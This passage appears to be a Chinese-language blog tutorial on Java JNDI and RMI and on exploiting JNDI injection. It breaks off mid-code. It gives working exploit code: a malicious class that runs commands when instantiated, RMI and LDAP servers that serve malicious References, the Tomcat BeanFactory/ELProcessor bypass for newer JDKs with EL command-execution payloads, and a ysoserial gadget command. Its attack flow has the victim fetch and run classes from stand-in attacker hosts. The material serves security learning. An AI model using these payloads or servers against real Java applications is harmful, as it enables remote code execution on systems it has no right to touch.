在一开始很多人都会被jndi、rmi这些词汇搞的晕头转向，而且很多文章中提到了可以用jndi调用rmi，就更容易让人发昏了。我们只要知道jndi是对各种访问目录服务的逻辑进行了再封装，也就是以前我们访问rmi与ldap要写的代码差别很大，但是有了jndi这一层，我们就可以用jndi的方式来轻松访问rmi或者ldap服务，这样访问不同的服务的代码实现基本是一样的。一图胜千言： 从图中可以看到jndi在访问rmi时只是传了一个键foo过去，然后rmi服务端返回了一个对象，访问ldap这种目录服务时，传过去的字符串比较复杂，包含了多个键值对，这些键值对就是对象的属性，LDAP将根据这些属性来判断到底返回哪个对象。 JNDI类 在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是： //主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类； javax.naming //主要用于目录操作，它定义了DirContext接口和InitialDir- Context类； javax.naming.directory //在命名目录服务器中请求事件通知； javax.naming.event //提供LDAP支持； javax.naming.ldap //允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。 javax.naming.spi InitialContext类 在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。 构造方法 //构建一个初始上下文。 InitialContext() //构造一个初始上下文，并选择不初始化它。 InitialContext(boolean lazy) //使用提供的环境构建初始上下文。 InitialContext(Hashtable environment) 实现代码 InitialContext initialContext = new InitialContext(); 常用方法 //将名称绑定到对象。 bind(Name name, Object obj) //枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。 list(String name) //检索命名对象。 lookup(String name) //将名称绑定到对象，覆盖任何现有绑定。 rebind(String name, Object obj) //取消绑定命名对象。 unbind(String name) 实现代码 package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class Client { public static void main( String[] args ) throws NamingException, RemoteException { String uri = \"rmi://127.0.0.1:1099/test\"; InitialContext initialContext = new InitialContext(); HelloInterface helloInterface = (HelloInterface) initialContext.lookup(uri); System.out.println(helloInterface.says(\"hello\")); } } Reference类 该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。 在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。具体可以查看Java技术回顾之JNDI：命名和目录服务基本概念。 构造方法 //为类名为“className”的对象构造一个新的引用。 Reference(String className) //为类名为“className”的对象和地址构造一个新引用。 Reference(String className, RefAddr addr) //为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 Reference(String className, RefAddr addr, String factory, String factoryLocation) //为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。 Reference(String className, String factory, String factoryLocation) 实现代码 String url = \"http://127.0.0.1:8080\"; Reference reference = new Reference(\"test\", \"test\", url); 在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性： 参数1：className - 远程加载时所使用的类名 参数2：classFactory - 加载的class中需要实例化类的名称 参数3：classFactoryLocation - 提供classes数据的地址可以是file/ftp/http协议 Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 补充 常用方法 void add(int posn, RefAddr addr) 将地址添加到索引posn的地址列表中。 void add(RefAddr addr) 将地址添加到地址列表的末尾。 void clear() 从此引用中删除所有地址。 RefAddr get(int posn) 检索索引posn上的地址。 RefAddr get(String addrType) 检索地址类型为“addrType”的第一个地址。 Enumeration getAll() 检索本参考文献中地址的列举。 String getClassName() 检索引用引用的对象的类名。 String getFactoryClassLocation() 检索此引用引用的对象的工厂位置。 String getFactoryClassName() 检索此引用引用对象的工厂的类名。 Object remove(int posn) 从地址列表中删除索引posn上的地址。 int size() 检索此引用中的地址数。 String toString() 生成此引用的字符串表示形式。 JNDI代码实现 在JNDI中提供了绑定和查找的方法 bind(Name name, Object obj) ：将名称绑定到对象中 lookup(String name)： 通过名字检索执行的对象 实现过程 类似rmi的实现过程，只不过最后绑定和检索的时候有一点差别。 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.class（定义远程接口） package org.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { String says (String name) throws RemoteException; } HelloImpl.class（HelloInterface远程接口实现类） package org.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class HelloImpl extends UnicastRemoteObject implements HelloInterface{ protected HelloImpl() throws RemoteException { } @Override public String says(String name) throws RemoteException { return \"test \" + name; } } Server.class（注册远程对象并绑定） package org.example; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException { //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL,\"rmi://127.0.0.1:1099\"); //初始化环境 InitialContext ctx = new InitialContext(env); // 创建一个注册表 LocateRegistry.createRegistry(1099); // 远程调用对象 HelloInterface hello = new HelloImpl(); // 绑定 ctx.bind(\"test\", hello); } } Client.class（远程调用） package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class Client { public static void main( String[] args ) throws NamingException, RemoteException { //初始化环境 InitialContext init = new InitialContext(); //JNDI的方式获取远程对象 HelloInterface hello = (HelloInterface) init.lookup(\"rmi://127.0.0.1:1099/test\"); // 调用方法 System.out.println(hello.says(\"123\")); } } JNDI动态协议转换 我们上面的demo提前配置了jndi的初始化环境，还配置了Context.PROVIDER_URL，这个属性指定了到哪里加载本地没有的类，所以，上面的demo中 init.lookup(\"rmi://127.0.0.1:1099/test\")这一处代码改为init.lookup(\"test\")也是没啥问题的。 那么动态协议转换是个什么意思呢？其实就是说即使提前配置了Context.PROVIDER_URL属性，当我们调用lookup()方法时，如果lookup方法的参数像demo中那样是一个uri地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象，而不是去Context.PROVIDER_URL设置的地址去加载对象(如果感兴趣可以跟一下源码，可以看到具体的实现）。 正是因为有这个特性，才导致当lookup()方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。 但是你以为直接让受害者去攻击者指定的rmi注册表加载一个类回来就能完成攻击吗，是不行的，因为受害者本地没有攻击者提供的类的class文件，所以是调用不了方法的，所以我们需要借助接下来要提到的东西。 JNDI Naming Reference Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性： className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议； 当然，要把一个对象绑定到RMI注册表中，这个对象需要继承UnicastRemoteObject，但是Reference没有继承它，所以我们还需要封装一下它，用 ReferenceWrapper 包裹一下Reference实例对象，这样就可以将其绑定到RMI注册表，并被远程访问到了 // 第一个参数是远程加载时所使用的类名 // 第二个参数是要加载的类的完整类名(这两个参数可能有点让人难以琢磨，往下看你就明白了） // 第三个参数就是远程class文件存放的地址了 Reference refObj = new Reference(\"refClassName\", \"insClassName\", \"http://example.com:8888/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); registry.bind(\"refObj\", refObjWrapper); 当有客户端通过lookup(\"refObj\")获取远程对象时，获取的是一个Reference存根（Stub),由于是Reference的存根，所以客户端会现在本地的classpath中去检查是否存在类refClassName，如果不存在则去指定的url（http://example.com:8888/refClassName.class）动态加载，并且调用`insClassName`的**无参构造函数**，所以**可以在构造函数里写恶意代码。当然除了在无参构造函数中写利用代码，还可以利用java的 static代码块 来写恶意代码，因为static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。** 了解更多关于static代码块，参考：https://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html JNDI注入 JNDI注入原理 就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行 JNDI注入的利用条件 客户端的lookup()方法的参数可控 服务端在使用Reference类时，classFactoryLocation参数可控 上面两个都是在编写程序时可能存在的脆弱点（任意一个满足就行），除此之外，jdk版本在JNDI注入中也起着至关重要的作用，而且不同的攻击Payload对jdk的版本要求也不一致，这里就全部列出来： JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端JVM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 可以看出RMI的Codebase限制明显比LDAP多，所以我们在日站的时候，最好也是用LDAP来进行注入。 JNDI注入攻击流程 攻击者通过可控url触发动态协议转换(rmi://attack:1090/Exploit) 受害者服务器原上下文环境被转换为rmi://attack:1090/Exploit 受害者服务器去rmi://attack:1090/Exploit请求绑定对象Exploit，攻击者实现准备好的RMI服务器返回一个ReferenceWrapper对象(Reference(\"Class1\",\"Class2\",\"http://evil:8080/\")) 应用获取到ReferenceWrapper开始在本地查找Class1，发现无，则去请求http://evil:8080/Class2.class web服务器返回事先准备好的恶意class文件，受害者服务器调用Class2的构造方法，恶意代码执行 JNDI注入举例 创建恶意类Evil（不能带package） import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.Hashtable; public class Evil implements ObjectFactory { // 实现接口ObjectFactory，不然会报错，虽然不影响执行 public Evil() throws IOException { // 构造方法，加载时会自动调用 exec(\"open -na Calculator\"); } public static void exec(String cmd) throws IOException { Process runcmd = Runtime.getRuntime().exec(cmd); InputStreamReader inputStreamReader = new InputStreamReader(runcmd.getInputStream()); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String tmp; while ((tmp = bufferedReader.readLine()) != null){ System.out.println(tmp); } inputStreamReader.close(); bufferedReader.close(); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } 常见RMI服务端，绑定恶意的Reference到rmi注册表 package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import javax.naming.Reference; import java.io.IOException; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class App { public static void main(String[] args) throws IOException, NamingException { //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL,\"rmi://127.0.0.1:1099\"); //初始化环境 InitialContext ctx = new InitialContext(env); // 创建一个注册表 LocateRegistry.createRegistry(1099); // 绑定恶意的Reference到rmi注册表 // 注意，classFactoryLocation地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码 Reference reference = new Reference(\"Evil\", \"Evil\", \"http://127.0.0.1:8888/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); ctx.bind(\"evil\", referenceWrapper); } } 客户端远程调用evil对应类 package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", String.valueOf(true)); // 参考上面的利用条件，低版本不需要设置 System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", String.valueOf(true)); // 参考上面的利用条件，低版本不需要设置 //初始化环境 InitialContext init = new InitialContext(); // 远程调用evil，然后找不到服务端类Evil，就会调用http://127.0.0.1:8888/Evil.class init.lookup(\"rmi://127.0.0.1:1099/evil\"); } } 步骤 启动RMI服务端 编译Evil.java为Evil.class，并启动http服务 客户端运行，远程调用evil JNDI注入Debug 在lookup下断点进行分析 堆栈调用情况 首先调用InitialContext.lookup，getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象，然后在对应协议中去lookup搜索 然后就会调用GenericURLContext.lookup()方法，此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址，不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext，进入不同的协议路线。 public Object lookup(String var1) throws NamingException { // 获取rmi注册中心的相关数据 ResolveResult var2 = this.getRootURLContext(var1, this.myEnv); // 获取注册中心对象 Context var3 = (Context)var2.getResolvedObj(); Object var4; try { // 去注册中心lookup，进入此处 lookup var4 = var3.lookup(var2.getRemainingName()); } finally { var3.close(); } return var4; } 跟进lookup，此处调用的是RegistryContext.lookup() 其中从RMI注册表中lookup查询到服务端中目标类的Reference后返回一个ReferenceWrapper_Stub类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用decodeObject()函数来解析 然后跟进RegistryContext.decodeObject，先判断入参ReferenceWrapper_Stub类实例是否是RemoteReference接口实现类实例，而ReferenceWrapper_Stub类正是实现RemoteReference接口类的，因此通过判断调用getReference()来获取到ReferenceWrapper_Stub类实例中的Reference即我们在恶意RMI注册中绑定的恶意Reference；再往下调用NamingManager.getObjectInstance()来获取远程服务端上的类实例 继续跟NamingManager.getObjectInstance() 进入getObjectFactoryFromReference，到loadClass()时，就会向工厂请求恶意的class 然后看到了熟悉的newInstance()（实例化），想想写的Evil.java 只有一个构造函数，实例化之后，就会执行构造函数中的恶意代码。 实例化后： 继续跟，getObjectFactoryFromReference()返回的类需要为ObjectFactory，所以这里也是为什么我们的恶意类要实现ObjectFactory这个接口，不然会报错，但是不影响执行。 绕过高版本JDK（8u191+）限制 如何绕过高版本JDK的限制进行JNDI注入利用 绕过高版本JDK（8u191+）限制 Exploitng JNDI Injection In Java 由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 两种绕过方法如下： 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。 简单地说，在低版本JDK的JNDI注入中，主要利用的就是classFactoryLocation这个参数来实现远程加载类利用的。但是在高版本JDK中对classFactoryLocation这个途径实现了限制，但是对于classFactory这个参数即本地ClassPath中如果存在Gadget的话还是能够进行JNDI注入攻击的。 我们先来看一些基本概念，然后再分析这两种绕过方法。 关于Codebase Oracle官方关于Codebase的说明：https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。 当对象发送序列化数据时，会在序列化流中附加上Codebase的信息，这个信息告诉接收方到什么地方寻找该对象的执行代码。Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。在大多数情况下，你可以在命令行上通过属性 java.rmi.server.codebase 来设置Codebase。 例如，如果所需的类文件在Evil的根目录下，那么设置Codebase的命令行参数如下（如果你把类文件打包成了jar，那么设置Codebase时需要指定这个jar文件）： -Djava.rmi.server.codebase=http://url:8080/ 当接收程序试图从该URL的Evil上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件： http://url:8080/com/project/test.class 关于JNDI Naming Reference的限制 如前文所述，JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。 NamingManager.java static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class clas = null; // Try to use current class loader try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue // e.printStackTrace(); } // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } 代码中会先尝试在本地CLASSPATH中加载类，不行再从Codebase中加载，codebase的值是通过ref.getFactoryClassLocation()获得。 public Class loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException { ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); } 最后通过 VersionHelper12.loadClass() 中 URLClassLoader 加载了远程class。所以java.rmi.server.useCodebaseOnly不会限制JNDI Reference的利用，有影响的是高版本JDK中的这几个系统属性： com.sun.jndi.rmi.object.trustURLCodebase com.sun.jndi.cosnaming.object.trustURLCodebase com.sun.jndi.ldap.object.trustURLCodebase 做个实验，我们在JDK1.8.0_181下使用 RMI Server 构造恶意的JNDI Reference进行JNDI注入，报错如下： Exception in thread \"main\" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) at javax.naming.InitialContext.lookup(InitialContext.java:417) 而此时使用LDAP Server返回恶意Reference是可以成功利用的，因为JDK 8u191以后才对LDAP JNDI Reference进行了限制。 绕过高版本JDK限制：利用本地Class作为Reference Factory 在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class； 这个工厂类必须在受害目标本地的CLASSPATH中 工厂类必须实现 javax.naming.spi.ObjectFactory 接口 至少存在一个 getObjectInstance() 方法 org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。 该类在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。 利用举例 根据beanFactory的代码逻辑，要求传入的Reference为ResourceRef类，这个情况下，目标Bean Class必须有一个无参构造方法，有public的setter方法且参数为一个String类型。事实上，这些setter不一定需要是set..开头的方法，根据org.apache.naming.factory.BeanFactory中的逻辑，我们可以把某个方法强制指定为setter。 然后大佬们找到了javax.el.ELProcessor可以作为目标Class。 pom.xml（双方均需要） org.apache.tomcat tomcat-catalina 8.5.0 org.apache.el com.springsource.org.apache.el 7.0.26 Server package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.NamingException; import javax.naming.StringRefAddr; import java.io.IOException; import java.rmi.AlreadyBoundException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class App { public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); System.out.println(\"RMI LISTEN PORT 1099\"); // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null); // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码 ref.add(new StringRefAddr(\"forceString\", \"x=eval\")); // 利用表达式执行命令 ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/System/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\\\")\")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(\"Exploit\", referenceWrapper); } } Client package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { //初始化环境 InitialContext init = new InitialContext(); // 寻找Exploit，然后会执行EL表达式 init.lookup(\"rmi://127.0.0.1:1099/Exploit\"); } } 几种变体的表达式 前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法： import javax.el.ELProcessor; public class Test { public static void main(String[] args) { String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + \".newInstance().getEngineByName('nashorn')\" + \".eval(\\\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\"; // String poc = \"''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())\" + // \".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')\" + // \".invoke(null),'calc.exe')}\"; // String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + // \".newInstance().getEngineByName('JavaScript')\" + // \".eval(\\\"java.lang.Runtime.getRuntime().exec('calc')\\\")\"; new ELProcessor().eval(poc); } } Debug分析 因为org.apache.naming.factory.BeanFactory 类在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。所以重点分析getObjectInstance() RegistryContext.lookup对RMI registry发请求,反序列获取到ReferenceWrapper_Stub，然后把反序列得到的ReferenceWrapper_Stub传给decodeObject() 跟进decodeObject，首先给获取到的var1 ReferenceWrapper_Stub调用getReference()方法，getReference方法通过获取ReferenceWrapper_Stub的ref属性然后发请求, 反序列请求结果得到真正绑定到RMI Registry上的对象(ResourceRef), 然后传给NamingManager.getObjectInstance()方法。 首先类型转换将object转换为Reference对象 然后ref.getFactoryClassName() 获取FactoryClassName，返回的是Reference对象的classFactory属性，然后传递到getObjectFactoryFromReference中，然后loadClass加载我们传入的org.apache.naming.factory.BeanFactory类, 再newInstance实例化该类并将其转换成ObjectFactory类型。 然后直接调用ObjectFactory接口实现类实例的getObjectInstance()函数，这里是BeanFactory类实例的getObjectInstance()函数 跟进BeanFactory.getObjectInstance，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例 接着获取Bean类为javax.el.ELProcessor后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的x=eval内容： 继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中 接着是多个do while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素 获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行恶意的EL表达式。 总结 这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是org.apache.naming.factory.BeanFactory； 由于org.apache.naming.factory.BeanFactory类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的javax.el.ELProcessor类； ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为forceString、内容为x=eval的StringRefAddr类实例，这里看org.apache.naming.factory.BeanFactory类的getObjectInstance()方法源码发现，程序会判断是否存在=号，若存在则将x属性的默认setter方法设置为我们eval；第二次是类型为x、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的x属性关联起来，x属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用javax.el.ELProcessor类的eval()函数执行恶意表达式从而达到攻击利用的目的 绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。 如果服务端ClassPath中存在反序列化漏洞多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。 利用举例 生成POC 假设目标系统中存在着有漏洞的CommonsCollections库，使用ysoserial生成一个CommonsCollections的利用Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 \"open -na Calculator\" | base64 LDAP Server package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class App { private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8888/#Exploit\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos > 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: 利用LDAP+Reference Factory // e.addAttribute(\"javaCodeBase\", cbstring); // e.addAttribute(\"objectClass\", \"javaNamingReference\"); // e.addAttribute(\"javaFactory\", this.codebase.getRef()); // Payload2: 返回序列化Gadget try { e.addAttribute(\"javaSerializedData\", 